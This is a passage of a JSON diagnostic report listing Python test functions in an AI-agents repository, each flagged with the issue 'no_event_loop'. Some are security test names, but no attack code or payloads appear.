          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_memory_backend_failure_handling",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_sub_agent_spawning",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_agent_collaboration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_evolution_trigger",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_metrics_tracking",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_tool_selection_for_strategy",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_async_tool_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_sync_tool_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_concurrent_execution_windows",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_memory_usage_stays_bounded",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_processing_speed",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "async_tool",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_agent_registration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_single_agent_delegation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_multi_agent_delegation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_no_suitable_agents",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_parallel_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_sequential_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_collaborative_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_consensus_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_task_decomposition",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_hierarchical_delegation_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_swarm_creation_and_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_swarm_convergence",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_blackboard_read_write",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_blackboard_subscriptions",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_blackboard_pattern_querying",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_message_pattern_analysis",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_specialization_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_full_emergent_behavior_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_concurrent_task_processing",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_large_swarm_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_memory_usage_with_many_agents",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_agent_failure_handling",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_partial_parallel_execution_failure",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_blackboard_resilience",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_customer_support_agent",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_data_analyst_agent",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "test_orchestrator_metrics_collection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
          "function": "benchmark_causal_inference_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
          "function": "benchmark_working_memory_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
          "function": "benchmark_temporal_reasoning_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
          "function": "benchmark_integrated_reasoning_concurrency",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
          "function": "test_full_benchmark_suite",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
          "function": "test_performance_targets",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
          "function": "execute_query",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "causal_engine",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "working_memory",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "tree_of_thoughts",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "temporal_engine",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "integrated_controller",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "performance_optimizer",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_causal_discovery_basic",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_causal_discovery_ensemble",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_intervention_analysis",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_counterfactual_analysis",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_accuracy_target",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_memory_storage_and_retrieval",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_memory_consolidation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_coherence_tracking",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_token_limit_compliance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_hierarchical_organization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_basic_reasoning",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_adaptive_search_strategy",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_quality_scoring",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_working_memory_integration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_parallel_exploration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_pattern_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_anomaly_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_multi_horizon_prediction",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_causal_temporal_analysis",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_temporal_state_management",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_reasoning_mode_selection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_multi_system_coordination",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_session_management",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_performance_targets",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_concurrent_reasoning_sessions",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_cache_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_resource_monitoring",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_adaptive_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_performance_bottleneck_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_end_to_end_reasoning_workflow",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_system_resilience",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_scalability_under_load",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_memory_and_learning_integration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_causal_discovery_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_memory_system_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
          "function": "test_temporal_analysis_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "function": "test_full_validation_suite",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "function": "run_causal_validation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "function": "run_temporal_validation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "function": "run_reasoning_validation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "function": "run_integration_validation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_input_validation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_simulate_input_validation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_authentication_bypass",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_simulate_authentication",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_authorization_enforcement",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_simulate_authorization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_data_encryption",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_simulate_encryption",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_simulate_decryption",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_sql_injection_protection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_xss_protection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_command_injection_protection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_path_traversal_protection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_valid_input_acceptance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_authentication_bypass_attempts",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_authorization_enforcement",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_session_security",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_validate_session",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_sensitive_data_encryption",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_sensitive_data_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_data_masking",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_simulate_data_masking",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_agent_message_encryption",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_simulate_agent_message_encryption",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "test_agent_identity_verification",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "function": "_simulate_agent_verification",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_analyze_task_complexity_low",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_analyze_task_complexity_high",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_analyze_task_with_missing_information",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_complexity_analysis_data_size_scaling",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_learn_from_execution_success",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_learn_from_execution_failure",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_strategy_recommendation_generation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_pattern_recognition_across_tasks",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_performance_metrics_collection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_performance_trend_analysis",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_performance_bottleneck_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_optimal_agent_selection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_multi_agent_team_selection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_load_balancing_consideration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_capability_matching",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_resource_allocation_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_cost_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_dynamic_resource_scaling",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_complete_task_orchestration_cycle",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "test_adaptive_orchestration_with_feedback",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_analyze_complexity",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_complexity_analysis",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_learn_from_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_learn_from_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_recommend_strategy",
          "issue": "no_event_loop"
        },
        {
